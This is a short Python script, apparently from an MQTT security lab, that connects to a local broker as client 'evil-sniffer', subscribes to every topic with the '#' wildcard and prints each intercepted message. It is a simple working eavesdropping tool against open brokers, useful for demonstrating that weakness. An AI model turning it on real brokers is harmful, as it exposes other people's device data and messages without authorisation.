import paho.mqtt.client as mqtt

BROKER_HOST = "127.0.0.1"
BROKER_PORT = 1883

def on_connect(client, userdata, flags, reason_code, properties=None):
    print("Connexion réussie")
    print("Interception de tous les topics")
    client.subscribe("#")

def on_message(client, userdata, message):
    print(
        f"[INTERCEPTÉ] {message.topic} -> "
        f"{message.payload.decode()}"
    )

client = mqtt.Client(
    mqtt.CallbackAPIVersion.VERSION2,
    client_id="evil-sniffer"
)

client.on_connect = on_connect
client.on_message = on_message

client.connect(BROKER_HOST, BROKER_PORT)

client.loop_forever()